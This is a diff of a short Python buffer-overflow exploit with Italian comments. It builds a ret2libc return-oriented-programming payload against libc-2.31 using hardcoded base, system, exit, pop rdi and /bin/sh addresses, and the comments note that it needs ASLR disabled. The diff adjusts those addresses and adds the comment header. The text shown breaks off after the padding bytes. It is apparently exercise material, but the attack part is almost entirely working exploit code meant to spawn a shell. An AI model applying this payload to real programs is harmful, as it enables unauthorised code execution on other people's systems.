@@ -1,17 +1,18 @@
 import struct
 import sys
 
+#Questo exploit si basa su libc-2.31 e sfrutta il tool ropper per ricavare gli indirizzi dei gadget.
+# Ha bisogno di ASLR disabilitato.
+
 def main():
-    #"Questo exploit si basa su libc-2.31 e sfrutta il tool ropper per ricavare gli indirizzi dei gadget.
-    
-    libc_addr = 0x7ffff7dc9000 #indirizzo base di libc nel file eseguibile
+    libc_addr = 0x7ffff7dc8000 #indirizzo base di libc nel file eseguibile
 
     ret = libc_addr + 0xc1801 #offset
     pop_rdi = libc_addr + 0x23b6a #offset
     bin_sh = libc_addr + 0x1b45bd #offset
 
-    system_addr = 0x7ffff7e1b290
-    exit_addr = 0x7ffff7e0fa40
+    system_addr = 0x7ffff7e1a290
+    exit_addr = 0x7ffff7e0ea40
 
     payload = b"A" * 256
     payload += b"BBBBBBBB"
